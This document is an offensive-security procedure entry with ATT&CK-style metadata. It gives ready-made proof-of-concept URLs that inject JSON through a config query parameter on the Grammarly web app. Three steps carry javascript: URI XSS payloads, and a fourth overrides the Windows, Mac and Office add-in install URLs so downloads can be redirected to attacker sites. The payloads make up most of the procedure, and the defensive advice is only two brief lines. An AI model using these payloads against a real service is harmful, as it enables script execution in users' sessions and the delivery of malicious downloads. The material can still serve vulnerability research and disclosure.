---
tags:
  - poc-crafting
  - config-injection
  - xss
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/grammarly-xss-poc-new-doc]]'
  - '[[commands/grammarly-xss-poc-main-page]]'
  - '[[commands/grammarly-xss-poc-office-addin]]'
  - '[[commands/grammarly-config-override-download-urls]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 80ae2054-1bc9-4c52-9e8d-7ab7cf87ee4b
created_at: '2025-12-13T23:56:20.275Z'
updated_at: '2025-12-13T23:56:20.275Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft PoC URLs for Config Injection

## Summary

This procedure creates proof-of-concept URLs that inject malicious JSON configurations via the ?config= parameter to override application settings.

## Description

In vulnerable web apps, crafting URLs with encoded JSON allows bypassing partial validations to inject payloads like javascript: URIs for XSS. This targets Grammarly endpoints and can lead to script execution or logic alterations.

## Requirements

1. Browser or HTTP client
2. Knowledge of URL encoding
3. Target application URL

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all query parameters
- Block non-https schemes in config URLs

## Objectives

1. Inject arbitrary config values
2. Prepare for XSS triggering
3. Demonstrate vulnerability

## Instructions

### Step 1: Create XSS PoC for New Document

**Context**: Override subscription and redirect properties.

**Command** ([[commands/grammarly-xss-poc-new-doc]]):
```bash
https://app.grammarly.com/docs/new?config={%22account%22:{%22subscription%22:%22javascript:alert(document.domain)//%22},%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
```

> This sets up XSS for subscription interactions.

### Step 2: Create XSS PoC for Main Page

**Context**: Override api.redirect for upgrade features.

**Command** ([[commands/grammarly-xss-poc-main-page]]):
```bash
https://app.grammarly.com/?config={%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
```

> Triggers on upgrade clicks.

### Step 3: Create XSS PoC for Office Add-in

**Context**: Override infoURL property.

**Command** ([[commands/grammarly-xss-poc-office-addin]]):
```bash
https://app.grammarly.com/?config={%22crossPlatformOfficeAddin%22:{%22infoURL%22:%22javascript:alert(document.domain)//%22}}
```

> Affects add-in access.

### Step 4: Create Config Override for Downloads

**Context**: Alter install URLs without XSS.

**Command** ([[commands/grammarly-config-override-download-urls]]):
```bash
https://app.grammarly.com/?config={%22crossPlatformOfficeAddin%22:{%22infoURL%22:%22https://example.com%22},%22officeAddin%22:{%22installURL%22:%22https://example.com%22},%22desktop%22:{%22windows%22:{%22installURL%22:%22https://example.com%22},%22mac%22:{%22installURL%22:%22https://example.com%22}}}
```

> Redirects downloads to malicious sites.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques



## Commands Used

- [[commands/grammarly-xss-poc-new-doc]]
- [[commands/grammarly-xss-poc-main-page]]
- [[commands/grammarly-xss-poc-office-addin]]
- [[commands/grammarly-config-override-download-urls]]

## Tools Used



## Tags

- [[poc-crafting]]
- [[config-injection]]
